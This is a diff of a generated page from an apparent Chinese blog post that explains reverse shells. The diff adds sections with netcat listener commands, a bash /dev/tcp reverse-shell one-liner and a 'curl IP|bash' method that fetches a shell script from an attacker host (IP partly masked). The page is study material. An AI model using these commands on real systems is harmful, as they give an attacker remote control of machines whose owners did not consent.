@@ -146,7 +146,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="24">
-<input type="hidden" id="yelog_site_word_count" value="60.9k">
+<input type="hidden" id="yelog_site_word_count" value="62.4k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -521,12 +521,12 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-02-26 21:33:47'>2024-02-26 19:29</time>
+            发布时间 : <time class="date" title='最后更新: 2024-03-22 22:54:40'>2024-02-26 19:29</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:738</span>
+        <span>字数:898</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -545,7 +545,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%90%AB%E4%B9%89"><span class="toc-text">一、含义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%80%82%E7%94%A8%E6%83%85%E5%86%B5"><span class="toc-text">二、适用情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8E%9F%E7%90%86"><span class="toc-text">三、原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%96%B9%E5%BC%8F"><span class="toc-text">四、方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81linux%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">1、linux反弹shell</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%90%AB%E4%B9%89"><span class="toc-text">一、含义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%80%82%E7%94%A8%E6%83%85%E5%86%B5"><span class="toc-text">二、适用情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8E%9F%E7%90%86"><span class="toc-text">三、原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%96%B9%E5%BC%8F"><span class="toc-text">四、方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81linux%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">1、linux反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">（1）netcat反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">（2）利用bash反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-Curl-%E9%85%8D%E5%90%88"><span class="toc-text">(3)Curl 配合</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -573,8 +573,7 @@
 <p>​	3.A、B建立TCP连接</p>
 <p>​	4.A通过TCP服务将待执行命令发送到B</p>
 <p>​	5.B执行命令后将结果发送给A</p>
-<h3 id="四、方式"><a href="#四、方式" class="headerlink" title="四、方式"></a>四、方式</h3><h4 id="1、linux反弹shell"><a href="#1、linux反弹shell" class="headerlink" title="1、linux反弹shell"></a>1、linux反弹shell</h4><p>（1）netcat反弹shell</p>
-<p><strong>攻击机开启本地监听：</strong></p>
+<h3 id="四、方式"><a href="#四、方式" class="headerlink" title="四、方式"></a>四、方式</h3><h4 id="1、linux反弹shell"><a href="#1、linux反弹shell" class="headerlink" title="1、linux反弹shell"></a>1、linux反弹shell</h4><h5 id="（1）netcat反弹shell"><a href="#（1）netcat反弹shell" class="headerlink" title="（1）netcat反弹shell"></a>（1）netcat反弹shell</h5><p><strong>攻击机开启本地监听：</strong></p>
 <pre><code>netcat -lvvp 2333
 </code></pre>
 <p><code>-l</code>: 表示 <code>listen</code> 模式，即使 <code>netcat</code> 以服务器的方式监听连接请求。</p>
@@ -590,16 +589,19 @@
 
 <img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/202030.png" class="">
 
-<p>仿佛不能成功执行cd命令。。。</p>
-<p>（2）利用bash反弹shell</p>
-<p><strong>攻击机开启本地监听</strong>：</p>
+<h5 id="（2）利用bash反弹shell"><a href="#（2）利用bash反弹shell" class="headerlink" title="（2）利用bash反弹shell"></a>（2）利用bash反弹shell</h5><p><strong>攻击机开启本地监听</strong>：</p>
 <pre><code>netcat -lvvp 2333
 </code></pre>
 <p><strong>目标机主动连接攻击机：</strong></p>
 <pre><code>bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1
 或bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;
 # bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1
+注：/dev/&#123;tcp|udp&#125;/$&#123;host&#125;/$&#123;port&#125; 这个功能只在 bash 中存在，其它的 shell 如 sh、dash、zsh 中是没有的。
 </code></pre>
+<img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/211148.png" class="">
+
+<img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/211344.png" class="">
+
 <table>
 <thead>
 <tr>
@@ -612,18 +614,25 @@
 <td>表示以交互模式启动 Bash，即允许用户与 shell 进行交互。</td>
 </tr>
 <tr>
-<td>&gt;&amp;</td>
-<td>表示将标准输出和标准错误重定向到指定的位置。</td>
-</tr>
-<tr>
-<td>&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333</td>
+<td>&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333</td>
 <td>Linux环境中所有的内容都是以文件的形式存在的。在这里，它表示将 Bash 的标准输出和标准错误重定向到指定 IP 地址（<code>47.xxx.xxx.72</code>）和端口号（<code>2333</code>），让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td>
 </tr>
 <tr>
-<td></td>
-<td></td>
+<td>0&gt;&amp;1</td>
+<td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容（也就是目标机的输入由攻击机给出）</td>
 </tr>
 </tbody></table>
+<h5 id="3-Curl-配合"><a href="#3-Curl-配合" class="headerlink" title="(3)Curl 配合"></a>(3)Curl 配合</h5><p>首先，在攻击机的web目录里面创建一个index文件，(index.php或index.html)，内容如下：</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1
+</code></pre>
+<p>并开启2333端口的监听</p>
+<p>然后再目标上执行如下，即可反弹shell：</p>
+<pre><code>curl 47.xxx.xxx.72|bash
+#curl IP|bash 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等
+</code></pre>
+<img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/224516.png" class="">
+
+<img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/224922.png" class="">
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
